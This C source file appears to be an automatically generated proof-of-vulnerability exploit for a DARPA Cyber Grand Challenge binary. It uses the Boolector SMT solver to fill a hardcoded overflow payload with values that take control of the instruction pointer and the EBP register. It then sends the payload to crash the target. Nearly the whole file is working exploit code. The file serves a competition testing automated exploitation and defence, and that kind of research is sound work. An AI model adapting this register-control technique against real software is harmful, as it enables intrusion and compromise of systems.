#include <libcgc.h>
#include <stdlib.h>
#include <string.h>
#include <boolector.h>

enum register_t
{
    eax = 0,
    ecx = 1,
    edx = 2,
    ebx = 3,
    esp = 4,
    ebp = 5,
    esi = 6,
    edi = 7
};

int fd_ready(int fd) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = 1;
  tv.tv_usec = 0;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

unsigned int bswap32(unsigned int x) {
    return (((x) & 0x000000ff) << 24) | (((x) & 0x0000ff00) << 8) |         (((x) & 0x00ff0000) >> 8) | (((x) & 0xff000000) >> 24);
}

int send_all(int fd, const void *msg, size_t n_bytes)
{
  size_t len = 0;
  size_t tx = 0;
  while(len < n_bytes) {
    if (transmit(fd, (char *)msg + len, n_bytes - len, &tx) != 0) {
      return 1;
    }
    len += tx;
  }
  return 0;
}

void die(char *str) {
  send_all(2, str, strlen(str));
  _terminate(1);
}

void debug_print(const char *msg) {
  size_t len = (size_t)strlen(msg);
  transmit(2, msg, len, 0);
}

// receive into no particular buffer
size_t blank_receive( int fd, size_t n_bytes )
{
  size_t len = 0;
  size_t rx = 0;
  char junk_byte;
  char buf[0x100];
  size_t to_recv;

  while (len < n_bytes) {
    if (!fd_ready(fd)) {
        return len;
    }
    to_recv = n_bytes-len;
    to_recv = to_recv < 0x100 ? to_recv : 0x100;
    if (receive(fd, buf, to_recv, &rx) != 0) {
      len = 0;
      break;
    }

    if (rx == 0) {
      return len;
    }

    len += rx;
  }

  return len;
}

size_t receive_n( int fd, void *dst_buf, size_t n_bytes )
{
  char *dst = dst_buf;
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    len += rx;
  }

  return len;
}

int fd_ready_timeout(int fd, int timeout_us) {
  struct timeval tv;
  fd_set rfds;
  int readyfds = 0;

  FD_SET(fd, &rfds);

  tv.tv_sec = timeout_us/1000000;
  tv.tv_usec = timeout_us % 1000000;

  int ret;
  ret = fdwait(fd + 1, &rfds, NULL, &tv, &readyfds);

  /* bail if fdwait fails */
  if (ret != 0) {
    return 0;
  }
  if (readyfds == 0)
    return 0;

  return 1;
}

void safe_memcpy(char *dst, char *src, int len) {
  char *foo = malloc(len);
  memcpy(foo, src, len);
  memcpy(dst, foo, len);
  free(foo);
}

void* realloc_zero(void* pBuffer, size_t oldSize, size_t newSize) {
  void* pNew = realloc(pBuffer, newSize);
  if ( newSize > oldSize && pNew ) {
    size_t diff = newSize - oldSize;
    void* pStart = ((char*)pNew) + oldSize;
    memset(pStart, 0, diff);
  }
  return pNew;
}

int get_int_len(char *start, int base, int max) {
  char buf[0x20] = {0};
  memcpy(buf, start, max);
  char *endptr = 0;
  strtoul(buf, &endptr, base);
  if (endptr - buf > max) {
    return max;
  }
  return endptr - buf;
}

size_t receive_n_timeout( int fd, void *dst_buf, size_t n_bytes, int timeout_us )
{
  char *dst = dst_buf;
  size_t len = 0;
  size_t rx = 0;
  while(len < n_bytes) {
    if (!fd_ready_timeout(fd, timeout_us)) {
      return len;
    }
    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
      len = 0;
      break;
    }
    if (rx == 0) {
      return len;
    }
    len += rx;
  }

  return len;
}

char *strrev (char *str)
{
  int i;
  int len = 0;
  char c;
  if (!str)
    return NULL;
  while(str[len] != '\0'){
    len++;
  }
  for(i = 0; i < (len/2); i++)
  {
    c = str[i];
    str [i] = str[len - i - 1];
    str[len - i - 1] = c;
  }
  return str;
}

int itoa_len(int num, unsigned char* str, int len, int base)
{
  int negative = 0;
  if (num < 0) {
    negative = 1;
    num = -num;
    len -= 1;
  }

  int sum = num;
  int i = 0;
  int digit;

  if (len == 0)
    return -1;
  do
  {
    digit = sum % base;
    if (digit < 0xA)
      str[i++] = '0' + digit;
    else
      str[i++] = 'A' + digit - 0xA;
    sum /= base;
  } while (sum && (i < (len - 1)));
  if (i == (len - 1) && sum)
    return -1;

  if (negative) {
    str[i] = '-';
    i++;
  }

  str[i] = '\0';
  strrev((char*)str);
  return 0;
}

char to_char(char *str) {
  int i;
  char r = '\0';

  if (strlen(str) != 8)
    die("bv_assignment returned a string not of length 8\n");

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<8;i++)
    r |= ((str[7-i] - '0') & 1) << i;

  return r;
}

unsigned int to_int(char *str) {
  int i;
  int r = 0;

  if (strlen(str) != 32)
    die("bv_assignment returned a string not of length 32\n");

  /* result can '0', '1' or 'x', if 'x' just 0 */
  for(i=0;i<32;i++)
    r |= ((str[31-i] - '0') & 1) << i;

  return r;
}

typedef struct type1_vals_ {
   unsigned int ipval;
   unsigned int regval;
} type1_vals;

typedef struct type2_vals_ {
   unsigned int region_addr;
   unsigned int region_size;
   unsigned int read_size;
} type2_vals;


/*
 * Negotiate a type 1 pov. Caller specifies an ip bit mask, a register bit mask
 * and a general purpose register number (see the list below).
 *
   0 - eax
   1 - ecx
   2 - edx
   3 - ebx
   4 - esp
   5 - ebp
   6 - esi
   7 - edi
 *
 * Returns 0 on success. On success, the t1vals structure holds required IP
 * and register values that must be found when the target CB crashes. At the
 * time of the crash the following must hold:
 *  (crash_eip & ipmask) == t1vals->ipval
 *  (crash_REG & regmask) == t1vals->regval
 */
int type1_negotiate(unsigned int ipmask, unsigned int regmask, unsigned int regnum, type1_vals *t1vals) {
   uint32_t povType = 1;
   if (send_all(3, &povType, sizeof(povType)) ||
       send_all(3, &ipmask, sizeof(ipmask)) ||
       send_all(3, &regmask, sizeof(regmask)) ||
       send_all(3, &regnum, sizeof(regnum))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t1vals, sizeof(type1_vals)) != sizeof(type1_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Negotiate a type 2 pov.
 * Returns 0 on success. On success, the t2vals structure holds the address
 * (t2vals->region_addr) and size of a memory region (t2vals->region_size)
 * from which the POV must leak a specific number of bytes (t2vals->read_size).
 */
int type2_negotiate(type2_vals *t2vals) {
   uint32_t povType = 2;
   if (send_all(3, &povType, sizeof(povType))) {
      return -1;
   }
   if (receive_n(3, (unsigned char *)t2vals, sizeof(type2_vals)) != sizeof(type2_vals)) {
      return -1;
   }
   return 0;
}

/*
 * Submit the len bytes in the val buffer as the results of a type 2 POV
 * Returns 0 on success
 */
int type2_submit(const unsigned char *val, size_t len) {
   return send_all(3, val, len);
}

// Globals!
unsigned int ipmask = 0x7f7f7f7f;
unsigned int regmask = 0x7f7f7f7f;
type1_vals t1vals;
char *received_data = NULL;
char *payload = NULL;
size_t payload_buffer_len;
size_t recv_buf_len;
const size_t payload_len = 0x38;

// INTEGER STUFF
// the integers must be ordered by start loc
size_t payload_int_start_locs[] = {};
int payload_int_bases[] = {};
int payload_int_expected_lens[] = {};
// +1 to silence the warning if it's 0
int payload_int_corrections[0+1] = {0};
size_t recv_int_start_locs[] = {};
int recv_int_expected_lens[] = {};
int recv_int_corrections[0+1] = {0};
int recv_int_bases[] = {};


// function to get the real offsets
size_t real_payload_off(size_t payload_off) {
  size_t out_off = payload_off;
  for (int i = 0; i < 0; i++) {
    if (payload_off > payload_int_start_locs[i]+1) {
      out_off += payload_int_corrections[i];
    }
  }
  return out_off;
}

size_t real_recv_off(size_t recv_off) {
  size_t out_off = recv_off;
  for (int i = 0; i < 0; i++) {
    if (recv_off > recv_int_start_locs[i]+1) {
      out_off += recv_int_corrections[i];
    }
  }
  return out_off;
}

size_t check_for_recv_extra(size_t recv_start, size_t num_bytes) {
  size_t num_extra = 0;
  for (int i = 0; i < 0; i++) {
    if (recv_start <= recv_int_start_locs[i] && recv_start+num_bytes > recv_int_start_locs[i]) {
      num_extra += 8;
    }
  }
  return num_extra;
}

size_t fixup_recv_amount(size_t recv_off, size_t recv_amount) {
  // we want the recv amount to be what it would be if all integer lengths were the same
  size_t fixed_recv_amount = recv_amount;
  for (int i = 0; i < 0; i++) {
    if (recv_off <= recv_int_start_locs[i] && recv_off+recv_amount > recv_int_start_locs[i]) {
      // we read in an integer, get the length of the integer we read
      int len = get_int_len(received_data+real_recv_off(recv_int_start_locs[i]), recv_int_bases[i], recv_amount-(recv_int_start_locs[i]-recv_off));
      // store the difference between it and the expected length
      recv_int_corrections[i] = len-recv_int_expected_lens[i];
      // fix recv amount
      fixed_recv_amount -= recv_int_corrections[i];
    }
  }
  return fixed_recv_amount;
}

void set_payload_int_solve_result(Btor *btor, int bid, int base, int int_info_num) {
  char temp_int_buf[0x20] = {0};
  // get the solve result
  BoolectorNode *int_val = boolector_match_node_by_id(btor, bid);
  int temp_int = to_int(boolector_bv_assignment(btor, int_val));

  // convert to ascii
  itoa_len(temp_int, (unsigned char*)temp_int_buf, sizeof(temp_int_buf), base);
  // get the length, and the expected length
  int int_len = strlen(temp_int_buf);
  int expected_len = payload_int_expected_lens[int_info_num];
  int correction = int_len - expected_len;

  // now we move stuff if needed
  int real_int_start = real_payload_off(payload_int_start_locs[int_info_num]);
  // only move stuff if the correction wasn't set
  if (payload_int_corrections[int_info_num] != correction) {
    int dest_off = real_int_start + int_len;
    int current_off = real_int_start + expected_len + payload_int_corrections[int_info_num];
    // realloc if needed
    if (current_off > dest_off) {
      size_t old_payload_buffer_len = payload_buffer_len;
      payload_buffer_len += current_off - dest_off;
      payload = realloc_zero(payload, old_payload_buffer_len, payload_buffer_len);
    }
    safe_memcpy(payload + dest_off, payload + current_off, real_payload_off(payload_len)-current_off);
    payload_int_corrections[int_info_num] = correction;
  }
  memcpy(payload + real_int_start, temp_int_buf, int_len);

}

// end of fixup codes

void constrain_value_var(Btor *btor, int value_var_idx) {
  BoolectorNode *value_val_var = boolector_match_node_by_id(btor, value_var_idx);
  BoolectorNode *value_val = boolector_int(btor, t1vals.regval, 32);
  BoolectorNode *reg_mask = boolector_unsigned_int(btor, 0x7f7f7f7f, 32);
  BoolectorNode *value_val_var_fixed = boolector_and(btor, value_val_var, reg_mask);
  BoolectorNode *value_val_fixed = boolector_and(btor, value_val, reg_mask);
  BoolectorNode *con = boolector_eq(btor, value_val_fixed, value_val_var_fixed);
  boolector_assert(btor, con);
}

void constrain_ip_var(Btor *btor, int ip_var_idx) {
  BoolectorNode *ip_val_var = boolector_match_node_by_id(btor, ip_var_idx);
  BoolectorNode *ip_val = boolector_int(btor, t1vals.ipval, 32);
  BoolectorNode *ip_mask = boolector_unsigned_int(btor, 0x7f7f7f7f, 32);
  BoolectorNode *ip_val_var_fixed = boolector_and(btor, ip_val_var, ip_mask);
  BoolectorNode *ip_val_fixed = boolector_and(btor, ip_val, ip_mask);
  BoolectorNode *con = boolector_eq(btor, ip_val_fixed, ip_val_var_fixed);
  boolector_assert(btor, con);
}

// aliases
void constrain_register_value(Btor *btor, int value_var_idx) {
  constrain_value_var(btor, value_var_idx);
}

void constrain_ip_value(Btor *btor, int ip_var_idx) {
  constrain_ip_var(btor, ip_var_idx);
}

void hex_debug(const char *buf, size_t len) {
  char hex_str[0x1000];
  for (size_t i = 0; i < len; i++) {
    char curr = buf[i];
    if (((curr & 0xf0) >> 8) > 9) {
      hex_str[i*2] = 'A' + (int)((curr & 0xf0) >> 8)-10;
    }
    else {
      hex_str[i*2] = '0' + (int)((curr & 0xf0) >> 8);
    }
    if ((curr & 0xf) > 9) {
      hex_str[i*2+1] = 'A' + (int)(curr & 0xf)-10;
    }
    else {
      hex_str[i*2+1] = '0' + (int)(curr & 0xf);
    }
  }
  send_all(2, hex_str, 2*len);
  send_all(2, "\n", 1);
}

int do_pov() {
  enum register_t regnum = ebp;

  if (type1_negotiate(ipmask, regmask, regnum, &t1vals) != 0) {
    die("type1_negotiate failure\n");
  }

  char *error;
  int status;

  const char orig_payload[] = "\xce\xe5\xf6\xd5\xce\xe5\x31\xf1\xf5\xf5\x75\xf1\xf5\xd5\xf1\xf5\xb5\xf1\xf1\x75\xf1\xe5\xf1\x75\xf1\xf1\xb5\xf1\xf1\xf5\xf5\xf1\xf1\x75\x75\xf5\xf1\xf1\xf1\xf1\x00\xa0\x04\x08\xf5\xf5\xf1\xf1\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
  payload_buffer_len = payload_len;
  payload = malloc(payload_len);
  memcpy(payload, orig_payload, payload_len);
  recv_buf_len = 0xbc;
  received_data = calloc(recv_buf_len, 1);

  BoolectorNode *cur_byte;
  BoolectorNode *temp_1;
  BoolectorNode *temp_2;
  BoolectorNode *temp_con;


  // current position in they payload
  size_t payload_off = 0;
  size_t recv_off = 0;

  // *** integer stuff ***
  // a buffer for copying integers to and checking them
  char temp_int_buf[0x20];
  unsigned long temp_int;
  BoolectorNode *int_val;
  BoolectorNode *int_val_var;
  BoolectorNode *int_con;
  int recv_extra_for_int = 0;
  size_t fake_recv_amount = 0;
  size_t send_amount = 0;
  size_t recv_amount = 0;
  size_t old_recv_buf_len = 0;
  // *** end integer stuff ***

  // BoolectorNodes for use in challenge response
  BoolectorNode *stdout_val_var;
  BoolectorNode *stdout_val;
  BoolectorNode *stdout_con;
  BoolectorNode *payload_val;
  BoolectorNode *payload_val_var;
  BoolectorNode *payload_con;

  Btor *btor_0 = boolector_new();
  boolector_set_opt(btor_0, "model_gen", 1);
  const char *smt_stmt_btor_0 = "(declare-fun byte_32 () (_ BitVec 8))\n"
"(declare-fun byte_30 () (_ BitVec 8))\n"
"(declare-fun byte_31 () (_ BitVec 8))\n"
"(declare-fun byte_33 () (_ BitVec 8))\n"
"(declare-fun value_var () (_ BitVec 32))\n"
"(assert\n"
" (let ((?x897 (concat (concat byte_33 byte_32) byte_31)))\n"
" (let ((?x84895 (concat ?x897 byte_30)))\n"
" (= ?x84895 value_var))))\n"
"(assert\n"
" (let ((?x963 ((_ extract 7 7) byte_30)))\n"
" (let (($x1610 (= (_ bv0 1) ?x963)))\n"
" (let (($x1057 (not $x1610)))\n"
" (let (($x1609 (= (_ bv10 8) byte_30)))\n"
" (let (($x1819 (not $x1609)))\n"
" (or $x1819 $x1057)))))))\n"
"(assert\n"
" (let ((?x1309 ((_ extract 7 7) byte_31)))\n"
" (let (($x1880 (= (_ bv0 1) ?x1309)))\n"
" (let (($x1910 (not $x1880)))\n"
" (let (($x1715 (= (_ bv10 8) byte_31)))\n"
" (let (($x1891 (not $x1715)))\n"
" (or $x1891 $x1910)))))))\n"
"(assert\n"
" (let ((?x964 ((_ extract 7 7) byte_33)))\n"
" (let (($x1619 (= (_ bv0 1) ?x964)))\n"
" (let (($x1816 (not $x1619)))\n"
" (let (($x1604 (= (_ bv10 8) byte_33)))\n"
" (let (($x1612 (not $x1604)))\n"
" (or $x1612 $x1816)))))))\n"
"(assert\n"
" (let ((?x1036 ((_ extract 7 7) byte_32)))\n"
" (let (($x1878 (= (_ bv0 1) ?x1036)))\n"
" (let (($x1921 (not $x1878)))\n"
" (let (($x1717 (= (_ bv10 8) byte_32)))\n"
" (let (($x1919 (not $x1717)))\n"
" (or $x1919 $x1921)))))))\n"
;
  boolector_parse(btor_0, smt_stmt_btor_0, &error, &status);
  if (error)
    die(error);
  constrain_value_var(btor_0, 6);
  if (payload_off > 0x32) {
    payload_val = boolector_unsigned_int(btor_0, payload[real_payload_off(0x32)], 8);
    payload_val_var = boolector_match_node_by_id(btor_0, 2);
    payload_con = boolector_eq(btor_0, payload_val_var, payload_val);
    boolector_assert(btor_0, payload_con);
  }
  if (payload_off > 0x30) {
    payload_val = boolector_unsigned_int(btor_0, payload[real_payload_off(0x30)], 8);
    payload_val_var = boolector_match_node_by_id(btor_0, 3);
    payload_con = boolector_eq(btor_0, payload_val_var, payload_val);
    boolector_assert(btor_0, payload_con);
  }
  if (payload_off > 0x31) {
    payload_val = boolector_unsigned_int(btor_0, payload[real_payload_off(0x31)], 8);
    payload_val_var = boolector_match_node_by_id(btor_0, 4);
    payload_con = boolector_eq(btor_0, payload_val_var, payload_val);
    boolector_assert(btor_0, payload_con);
  }
  if (payload_off > 0x33) {
    payload_val = boolector_unsigned_int(btor_0, payload[real_payload_off(0x33)], 8);
    payload_val_var = boolector_match_node_by_id(btor_0, 5);
    payload_con = boolector_eq(btor_0, payload_val_var, payload_val);
    boolector_assert(btor_0, payload_con);
  }
  if (boolector_sat(btor_0) != 10){
    die("unsat\n");
  }

  cur_byte = boolector_match_node_by_id(btor_0, 2);
   payload[real_payload_off(50)] = to_char(boolector_bv_assignment(btor_0, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_0, 3);
   payload[real_payload_off(48)] = to_char(boolector_bv_assignment(btor_0, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_0, 4);
   payload[real_payload_off(49)] = to_char(boolector_bv_assignment(btor_0, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_0, 5);
   payload[real_payload_off(51)] = to_char(boolector_bv_assignment(btor_0, cur_byte));

  Btor *btor_1 = boolector_new();
  boolector_set_opt(btor_1, "model_gen", 1);
  const char *smt_stmt_btor_1 = "(declare-fun byte_35 () (_ BitVec 8))\n"
"(declare-fun byte_37 () (_ BitVec 8))\n"
"(declare-fun byte_36 () (_ BitVec 8))\n"
"(declare-fun byte_34 () (_ BitVec 8))\n"
"(declare-fun ip_var () (_ BitVec 32))\n"
"(assert\n"
" (let ((?x1700 ((_ extract 7 7) byte_36)))\n"
" (let (($x1944 (= (_ bv0 1) ?x1700)))\n"
" (let (($x1947 (not $x1944)))\n"
" (let (($x1941 (= (_ bv10 8) byte_36)))\n"
" (let (($x1951 (not $x1941)))\n"
" (or $x1951 $x1947)))))))\n"
"(assert\n"
" (let ((?x1116 (concat (concat byte_37 byte_36) byte_35)))\n"
" (let ((?x1892 (concat ?x1116 byte_34)))\n"
" (= ?x1892 ip_var))))\n"
"(assert\n"
" (let ((?x1770 ((_ extract 7 7) byte_34)))\n"
" (let (($x1920 (= (_ bv0 1) ?x1770)))\n"
" (let (($x1908 (not $x1920)))\n"
" (let (($x1925 (= (_ bv10 8) byte_34)))\n"
" (let (($x1883 (not $x1925)))\n"
" (or $x1883 $x1908)))))))\n"
"(assert\n"
" (let ((?x1730 ((_ extract 7 7) byte_35)))\n"
" (let (($x1917 (= (_ bv0 1) ?x1730)))\n"
" (let (($x1888 (not $x1917)))\n"
" (let (($x1930 (= (_ bv10 8) byte_35)))\n"
" (let (($x1873 (not $x1930)))\n"
" (or $x1873 $x1888)))))))\n"
"(assert\n"
" (let ((?x1188 ((_ extract 7 7) byte_37)))\n"
" (let (($x1655 (= (_ bv0 1) ?x1188)))\n"
" (let (($x1814 (not $x1655)))\n"
" (let (($x1652 (= (_ bv10 8) byte_37)))\n"
" (let (($x1798 (not $x1652)))\n"
" (or $x1798 $x1814)))))))\n"
;
  boolector_parse(btor_1, smt_stmt_btor_1, &error, &status);
  if (error)
    die(error);
  constrain_ip_var(btor_1, 6);
  if (payload_off > 0x35) {
    payload_val = boolector_unsigned_int(btor_1, payload[real_payload_off(0x35)], 8);
    payload_val_var = boolector_match_node_by_id(btor_1, 2);
    payload_con = boolector_eq(btor_1, payload_val_var, payload_val);
    boolector_assert(btor_1, payload_con);
  }
  if (payload_off > 0x37) {
    payload_val = boolector_unsigned_int(btor_1, payload[real_payload_off(0x37)], 8);
    payload_val_var = boolector_match_node_by_id(btor_1, 3);
    payload_con = boolector_eq(btor_1, payload_val_var, payload_val);
    boolector_assert(btor_1, payload_con);
  }
  if (payload_off > 0x36) {
    payload_val = boolector_unsigned_int(btor_1, payload[real_payload_off(0x36)], 8);
    payload_val_var = boolector_match_node_by_id(btor_1, 4);
    payload_con = boolector_eq(btor_1, payload_val_var, payload_val);
    boolector_assert(btor_1, payload_con);
  }
  if (payload_off > 0x34) {
    payload_val = boolector_unsigned_int(btor_1, payload[real_payload_off(0x34)], 8);
    payload_val_var = boolector_match_node_by_id(btor_1, 5);
    payload_con = boolector_eq(btor_1, payload_val_var, payload_val);
    boolector_assert(btor_1, payload_con);
  }
  if (boolector_sat(btor_1) != 10){
    die("unsat\n");
  }

  cur_byte = boolector_match_node_by_id(btor_1, 2);
   payload[real_payload_off(53)] = to_char(boolector_bv_assignment(btor_1, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_1, 3);
   payload[real_payload_off(55)] = to_char(boolector_bv_assignment(btor_1, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_1, 4);
   payload[real_payload_off(54)] = to_char(boolector_bv_assignment(btor_1, cur_byte));
  cur_byte = boolector_match_node_by_id(btor_1, 5);
   payload[real_payload_off(52)] = to_char(boolector_bv_assignment(btor_1, cur_byte));



  send_all(1, payload+real_payload_off(payload_off), real_payload_off(payload_len)-real_payload_off(payload_off));

  // make sure we wait till it crashes
  blank_receive(0, 0x2000);

  return 0;
}

int main(void) {
  /* align the stack so that boolector can work in all circumstances */
  asm("and $0xfffffff0, %esp\n");

  /* terminate, stack hasn't been fixed up */
  _terminate(do_pov());
}